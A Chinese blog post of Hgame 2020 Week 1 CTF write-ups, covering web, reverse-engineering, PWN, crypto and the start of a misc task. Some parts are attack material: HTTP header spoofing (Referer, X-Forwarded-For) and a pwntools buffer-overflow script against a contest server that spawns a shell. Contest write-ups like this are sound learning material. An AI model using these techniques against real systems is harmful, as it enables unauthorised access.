<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/var/www/html/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/var/www/html/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="">
  <meta name="author" content="Aorui Zhang">
  <meta name="keywords" content="">
  <title>hgame_wp ~ My Tiny Ideas</title>

  <link rel="stylesheet" href="/var/www/html/lib/font-awesome/css/all.min.css"  >
<link rel="stylesheet" href="/var/www/html/lib/bootstrap/css/bootstrap.min.css"  >
<link rel="stylesheet" href="/var/www/html/lib/mdbootstrap/css/mdb.min.css"  >
<link rel="stylesheet" href="/var/www/html/lib/github-markdown/github-markdown.min.css"  >

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link rel="stylesheet" href="/var/www/html/lib/prettify/github-v2.min.css"  >

<link rel="stylesheet" href="/var/www/html/css/main.css"  >


  <link rel="stylesheet" href="/var/www/html/lib/fancybox/jquery.fancybox.min.css"  >


<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/var/www/html/">&nbsp;<strong>My Tiny Ideas</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/var/www/html/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/var/www/html/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/var/www/html/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/var/www/html/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/var/www/html/about/">关于</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background"
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;
           background-attachment: fixed;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期六, 一月 25日 2020, 8:28 晚上
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    6.2k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      31 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <p>记录一下Hgame的部分题解和一些解题时的思路</p>
<a id="more"></a>

<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p>
<pre><code class="http">Referer:https://vidar.club</code></pre>
<p>然后提示需要从本地访问，添加响应头：</p>
<pre><code class="http">X-Forwarded-For: 127.0.0.1</code></pre>
<p>接着提示flag会在2077年更新，所以添加响应头：</p>
<pre><code class="http">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</code></pre>
<p>再发送请求得到flag</p>
<pre><code class="flag">hgame{W0w!Your_heads_@re_s0_many!}</code></pre>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p>
<pre><code class="c++">v5 = (char *)&amp;unk_6020C4;
  while ( (signed int)v4 &lt; SHIDWORD(v4) )
  {
    v3 = s[(signed int)v4];
    if ( v3 == 100 )
    {
      v5 += 4;
    }
    else if ( v3 &gt; 100 )
    {
      if ( v3 == 115 )
      {
        v5 += 64;
      }
      else
      {
        if ( v3 != 119 )
        {
LABEL_12:
          puts(&quot;Illegal input!&quot;);
          exit(0);
        }
        v5 -= 64;
      }
    }
    else
    {
      if ( v3 != 97 )
        goto LABEL_12;
      v5 -= 4;
    }
    if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 )
      goto LABEL_22;
    LODWORD(v4) = v4 + 1;
  }
  if ( v5 == (char *)&amp;unk_60243C )
  {
    sprintf(&amp;v7, &quot;hgame{%s}&quot;, s, v4);
    puts(&quot;You win!&quot;);
    printf(&quot;Flag is: &quot;);
    puts(&amp;v7);
    exit(0);
  }
LABEL_22:
  puts(&quot;You died&quot;);
  exit(0);</code></pre>
<p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" srcset="/img/loading.gif" alt="maze"></p>
<p>即从（2，2）位置走到（15，16）位置</p>
<p>所以最后的flag为</p>
<pre><code class="flag">hgame{ssssddddddsssssddwwdddssssdssdd}</code></pre>
<h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p>
<p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p>
<pre><code class="c++">//只贴出了有用的部分并且稍做了排版
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char v6; // [rsp+10h] [rbp-60h]
  char v7; // [rsp+11h] [rbp-5Fh]
  char v8; // [rsp+12h] [rbp-5Eh]
  char v9; // [rsp+13h] [rbp-5Dh]
  char v10; // [rsp+14h] [rbp-5Ch]
  char v11; // [rsp+15h] [rbp-5Bh]
  char v12; // [rsp+16h] [rbp-5Ah]
  char v13; // [rsp+17h] [rbp-59h]
  __int64 v14; // [rsp+20h] [rbp-50h]
  char v15; // [rsp+28h] [rbp-48h]
  __int64 v16; // [rsp+30h] [rbp-40h]
  char v17; // [rsp+38h] [rbp-38h]
  char s; // [rsp+40h] [rbp-30h]        //地址是连续的，flag中间的具体内容是v24和v25起始的两个16
  char v19; // [rsp+41h] [rbp-2Fh]        //字节
  char v20; // [rsp+42h] [rbp-2Eh]
  char v21; // [rsp+43h] [rbp-2Dh]
  char v22; // [rsp+44h] [rbp-2Ch]
  char v23; // [rsp+45h] [rbp-2Bh]
  __int16 v24; // [rsp+46h] [rbp-2Ah]
  __int16 v25; // [rsp+56h] [rbp-1Ah]
  char v26; // [rsp+66h] [rbp-Ah]
  sub_4007E6();//只负责输出，没什么功能
  v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204;
  __isoc99_scanf(&quot;%39s&quot;, &amp;s);
  if ( strlen(&amp;s) == 39 &amp;&amp; s == &#39;h&#39; &amp;&amp; v19 == &#39;g&#39; &amp;&amp; v20 == &#39;a&#39; &amp;&amp; v21 == &#39;m&#39; &amp;&amp; v22 == &#39;e&#39; &amp;&amp; v23 == &#39;{&#39; &amp;&amp; v26 == &#39;}&#39; )// 共39位，hgame{***}格式
  {
    v14 = 0LL;
    v15 = 0;
    v16 = 0LL;
    v17 = 0;
    //这两条命令进行第一部分运算
    sub_400616((__int64)&amp;v14, (__int64)&amp;v24);   // 传入地址，对flag中的部分进行操作
    sub_400616((__int64)&amp;v16, (__int64)&amp;v25);

    //这里开始进行第二部分运算
    for ( i = 0; i &lt;= 7; ++i )
    {
      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置
      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或
      *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或
      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或
    }                                           

    //这里进行第三部分运算
    for ( j = 0; j &lt;= 7; ++j )
    {
      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       // v6 = 76;
                                                //   v7 = 60;
                                                //   v8 = 214;
                                                //   v9 = 54;
                                                //   v10 = 80;
                                                //   v11 = 136;
                                                //   v12 = 32;
                                                //   v13 = 204;
      if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_
      {
        puts(&quot;sry, wrong flag&quot;);
        exit(0);
      }
    }
    for ( k = 0; k &lt;= 7; ++k )
    {
      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);    // v6 = 76;
                                //这里异或之后又变成了V14最初始的值         //   v7 = 60;
                                                                    //   v8 = 214;
                                                                    //   v9 = 54;
                                                                    //   v10 = 80;
                                                                    //   v11 = 136;
                                                                    //   v12 = 32;
                                                                    //   v13 = 204;
      if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3
      {
        puts(&quot;Just one last step&quot;);
        exit(0);
      }
    }
    puts(&quot;Congratulations! You are already familiar with bitwise operation.&quot;);
    puts(&quot;Flag is your input.&quot;);
    exit(0);
  }
  puts(&quot;Illegal input!&quot;);
  exit(0);
}

//sub_400616() 第一部分运算所用到的函数
_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2)
{
  _BYTE *result; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i &lt;= 7; ++i )
  {
    if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 )
    {
      if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 )
      {
LABEL_17:
        puts(&quot;Illegal input!&quot;);
        exit(0);
      }
      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48;
    }
    else
    {
      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87;
    }
    if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 )
    {
      if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 )
        goto LABEL_17;
      result = (_BYTE *)(i + a1);
      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48;
    }
    else
    {
      result = (_BYTE *)(i + a1);
      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87;
    }
  }
  return result;
}
//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</code></pre>
<p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p>
<pre><code class="python">#-*- coding:utf-8 -*-
# 第三部分逆运算
v = [76, 60, 214, 54, 80, 136, 32, 204]
v0 = &#39;e4sy_Re_&#39;
v14 = []
for i in range(len(v0)):
    v14.append(ord(v0[i]) ^ v[i])
# print(v14)

v16 = []
v1 = &#39;Easylif3&#39;
for i in range(len(v1)):
    v16.append(ord(v1[i]) ^ v14[i])  # v14经过两次和v的异或又变回了原本的值
# print(v16)

# 第二部分逆运算
for i in range(8):
    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))
    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256
    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))
    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))
    v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256
    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))
    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))
    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256
    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))
    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))
    v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256
    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))

# print(v14)
# print(v16)

# 第一部分逆运算
v24 = [0 for i in range(16)]
v25 = [0 for i in range(16)]
alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]
# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算
for i in range(8):
    for j in alphabet:
        if 57 &gt;= j &gt; 47:
            tmp = j - 48
        else:
            tmp = j - 87
        v24[2*i]=j
        if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47:
            v24[2 * i + 1] = v14[i] - 16 * tmp + 48
            break
        elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96:
            v24[2 * i + 1] = v14[i] - 16 * tmp + 87
            break
        else:
            continue

for i in range(8):
    for j in alphabet:
        v25[2 * i] = j
        if 57 &gt;= j &gt; 47:
            tmp = j - 48
        else:
            tmp = j - 87
        if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96:
            v25[2 * i + 1] = v16[i] - 16 * tmp + 87
            break
        elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47:
            v25[2 * i + 1] = v16[i] - 16 * tmp + 48
            break
        else:
            continue

# print(v24)
# print(v25)
flag = &#39;hgame{&#39;+&#39;&#39;.join([chr(v24[i]) for i in range(16)]) + &#39;&#39;.join([chr(v25[i]) for i in range(16)])+&#39;}&#39;
print(flag)</code></pre>
<p>输出得到flag</p>
<pre><code class="flag">hgame{0f233e63637982d266cbf41ecb1b0102}</code></pre>
<p>到虚拟机上验证一下，发现结果正确</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" srcset="/img/loading.gif" alt="bitwise_operation2"></p>
<h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p>
<pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 len; // rax
  int len0; // edi
  unsigned __int64 v5; // rax
  _BYTE *v6; // rbx
  const char *v7; // rcx
  char flag; // [rsp+20h] [rbp-118h]

  puts(&quot;please input you flag:\n&quot;);
  memset(&amp;flag, 0, 0x100ui64);
  scanf(&quot;%s&quot;, &amp;flag, 100i64);
  len = strlen(&amp;flag);                          // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）
  len0 = len;
  if ( !len )                                   // 若输入空字符串，直接报错
  {
LABEL_6:
    v7 = &quot;try again\n&quot;;
    goto LABEL_7;
  }
  v5 = sub_140002000(len);                      
  v6 = malloc(v5);                                // 分配空间
  cryption(v6, (__int64)&amp;flag, len0);           // 加密算法部分
  if ( strncmp(v6, &quot;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&quot;, 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确
  {
    if ( v6 )
      free(v6);
    goto LABEL_6;
  }
  v7 = &quot;get it\n&quot;;
LABEL_7:
  puts(v7);
  return 0;
}
//最重要的cryption加密函数
signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3)
{
  int v3; // er10
  __int64 v4; // rax
  __int64 v5; // rbx
  _BYTE *v6; // rdi
  _BYTE *v7; // r9
  signed __int64 v8; // r11
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rax
  char v11; // cl
  // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度
  v3 = 0;
  v4 = a3 - 2;
  v5 = a2;
  v6 = a1;
  v7 = a1;
  if ( v4 &gt; 0 )
  {
    v8 = a2 + 1;
    v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1;
    v3 = 3 * v9;
    do
    {
      v10 = *(unsigned __int8 *)(v8 - 1);
      v8 += 3i64;
      *v7 = alphabet[v10 &gt;&gt; 2];
      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)];
      v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)];
      v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F];
      v7 += 4;
      --v9;
    }
    while ( v9 );
  }
  if ( v3 &lt; a3 )
  {
    *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2];
    if ( v3 == a3 - 1 )
    {
      v11 = 61;
      v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)];
    }
    else
    {
      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)];
      v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)];
    }
    v7[2] = v11;
    v7[3] = 61;
    v7 += 4;
  }
  *v7 = 0;
  return v7 - v6 + 1;
}</code></pre>
<p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p>
<pre><code class="python">alphabet=&#39;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</code></pre>
<p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p>
<pre><code class="python">#-*- coding:utf-8 -*-

def b64de(path_in, path_out):
    b64_str = open(path_in).read()
    charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
    # print(charset)
    bin_str = []
    for i in b64_str:
        if i != &#39;=&#39;:
            try:
                x = str(bin(charset.index(i))).replace(&#39;0b&#39;, &#39;&#39;)
            except ValueError:
                print(i)
            bin_str.append(&#39;{:0&gt;6}&#39;.format(x))  # 填充成6位
            # print(bin_str)
    b64_bin = bytearray()  # 最后只能写入bytes
    nums = len(bin_str) // 4
    remain = len(bin_str) % 4
    fore_part = bin_str[:4 * nums]  # 四个一组截取
    # print(fore_part)
    while fore_part:
        # 取4个6位base64字符，作为3个字节
        b64_tmp = &#39;&#39;.join(fore_part[:4])  # 4*6/8

        b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]]  # 转换成10进制
        # print(b64_tmp)
        for i in b64_tmp:
            b64_bin.append(i)
        fore_part = fore_part[4:]  # 向后移动四位

    if remain:
        remain_part = &#39;&#39;.join(bin_str[nums * 4:])
        # print(remain_part)
        tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]
        # print(tmp)
        for i in tmp:
            b64_bin.append(i)
    # print(b64_bin)
    fd = open(path_out, &#39;wb&#39;)
    fd.write(b64_bin)
    fd.close()

if __name__ == &#39;__main__&#39;:
    b64de(&quot;./pic_en.txt&quot;, &quot;./pic_de.txt&quot;)
</code></pre>
<p>输出的flag为：</p>
<pre><code class="flag">hgame{b45e6a_i5_50_eazy_6VVSQ}</code></pre>
<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p>
<pre><code class="c++"> sub_140002AE0((__int64)&amp;v13);                 // 大概是string类的构造函数
  sub_1400018D0(std::cin, &amp;v13);                // cin&gt;&gt;v13
  v15 = &quot;hgame{&quot;;
  sub_140002B30((__int64)&amp;v14);
  if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, &quot;}&quot;, 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***}
  {
    v5 = sub_140001900(std::cout, &quot;error&quot;);
    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830);
    sub_140003010(&amp;v14);
    sub_140002FA0(&amp;v13);
    result = 0i64;
  }
  else
  {
    for ( i = 6i64; ; i = v11 + 1 )             // 一波操作完全看不懂，猜测是根据&#39;_&#39;来分割字符串，分割成9个数
    {
      LOBYTE(v0) = &#39;_&#39;;
      v11 = find(&amp;v13, v0, i);
      if ( v11 == -1 )
        break;
      v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i);
      v17 = v16;
      v1 = sub_140003E80(v16);
      v18 = atoll(v1);
      sub_140004350(&amp;v14, &amp;v18);
      sub_140002FA0(&amp;v40);
    }
    v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i);
    v20 = v19;
    v2 = sub_140003E80(v19);
    v21 = atoll(v2);                            // 直接把字符串转换成长整型，说明字符串里就是以&#39;_&#39;连接的数字
    sub_140004350(&amp;v14, &amp;v21);
    sub_140002FA0(&amp;v41);
    v31 = 26727i64;                             // 根据下面的运算这里应该是两个矩阵
    v32 = 24941i64;
    v33 = 101i64;
    v34 = 29285i64;
    v35 = 26995i64;
    v36 = 29551i64;
    v37 = 29551i64;
    v38 = 25953i64;
    v39 = 29561i64;
    v22 = 1i64;
    v23 = 0i64;
    v24 = 1i64;
    v25 = 0i64;
    v26 = 1i64;
    v27 = 1i64;
    v28 = 1i64;
    v29 = 2i64;
    v30 = 2i64;
    for ( j = 0i64; j &lt; 3; ++j )                // 三个for循环时矩阵运算，如果满足条件就直接输出正确
    {
      for ( k = 0i64; k &lt; 3; ++k )
      {
        v12 = 0i64;
        for ( l = 0; l &lt; 3; ++l )
          v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j);
        if ( *(&amp;v31 + 3 * j + k) != v12 )
        {
          v3 = sub_140001900(std::cout, &quot;error&quot;);
          std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830);
          sub_140003010(&amp;v14);
          sub_140002FA0(&amp;v13);
          return 0i64;
        }
      }
    }
    v6 = sub_140001900(std::cout, &quot;you are good at re&quot;);
    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830);</code></pre>
<p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p>
<p>尝试一下</p>
<pre><code class="python">import numpy as np

a = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])
b = np.linalg.inv(a)
# print(b)
# print(np.dot(a,b))
c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])
flag = &#39;&#39;
d = np.dot(c, b)
for i in range(3):
    for j in range(3):
        flag += str(int(d.item(i, j))) + &#39;_&#39;
flag = &#39;hgame{&#39; + flag[:-1] + &#39;}&#39;
print(flag)</code></pre>
<p>提交提示成功，猜测正确</p>
<pre><code class="flag">hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</code></pre>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p>
<pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-ACh]
  char v5; // [esp+7Bh] [ebp-31h]
  unsigned int v6; // [esp+A0h] [ebp-Ch]
  int *v7; // [esp+A4h] [ebp-8h]

  v7 = &amp;argc;
  v6 = __readgsdword(0x14u);
  alarm(8u);
  setbuf(_bss_start, 0);
  memset(&amp;s, 0, 0xA0u);
  puts(&quot;Let&#39;s 0O0o\\0O0!&quot;);
  gets(&amp;s);
  if ( !memcmp(&quot;0O0o&quot;, &amp;v5, 7u) )
    backdoor();
  return 0;
}
//backdoor
int backdoor()
{
  return system(&quot;/bin/sh&quot;);
}</code></pre>
<p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p>
<pre><code class="python">from pwn import *
io = remote(&quot;47.103.214.163&quot;,&quot;20000&quot;)
#io=process(&quot;./Hard_AAAAA&quot;)
io.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
payload=&#39;a&#39;*123+&#39;0O0o\0O0&#39;
io.sendline(payload)
io.interactive()</code></pre>
<p>最终得到flag：</p>
<pre><code class="flag">hgame{0OoO0oo0O0Oo}</code></pre>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p>
<pre><code class="python">#-*- coding:utf-8 -*-
def gcdext(a, b):
    &quot;&quot;&quot;
    a: 模的取值
    b: 想求逆的值
    &quot;&quot;&quot;
    if b == 0:
        return 1, 0, a
    x, y, gcd = gcdext(b, a % b)
    return y, x - a // b * y, gcd


c = 275698465082361070145173688411496311542172902608559859019841
p = 681782737450022065655472455411
q = 675274897132088253519831953441
e = 13
n = p * q
# print(k)
fai = (p - 1) * (q - 1)
(d, k, g) = gcdext(e, fai)
# print(fai)
# print(k)
# print(m)
m = pow(c, d, n)
# print(m)
f = m.to_bytes(22, byteorder=&#39;big&#39;)
print(f)
</code></pre>
<p>直接求解出来flag</p>
<pre><code class="flag">hgame{t3Xt6O0k_R5A!!!}</code></pre>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p>
<pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>像是摩斯电码base64加密之后的东西</p>
<p>所以base64解码之后</p>
<pre><code class="morse">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></pre>
<p>果然是摩斯电码，然后解摩斯电码</p>
<pre><code class="python">#-*- coding:utf-8 -*-
